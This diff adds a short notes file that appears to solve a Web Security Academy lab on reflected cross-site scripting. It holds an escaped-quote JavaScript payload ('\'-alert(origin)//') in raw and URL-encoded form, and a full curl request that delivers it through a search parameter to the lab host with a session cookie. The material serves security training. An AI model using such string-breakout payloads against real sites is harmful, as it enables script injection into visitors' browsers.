@@ -1,0 +1,9 @@
+
+
+\'-alert(origin)//
+\'-alert(origin)%2F%2F
+
+curl -i -s -k -X $'GET' \
+    -H $'Host: 0afc00870456439281d39d760071005e.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://0afc00870456439281d39d760071005e.web-security-academy.net/?search=%5C%27-alert%28origin%29%2F%2F' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Sec-Gpc: 1' -H $'Te: trailers' \
+    -b $'session=iqf4sus1FBHCPF5sx7OJjxLvMykvFQYR' \
+    $'https://0afc00870456439281d39d760071005e.web-security-academy.net/?search=%5C%27-alert%28origin%29%2F%2F'
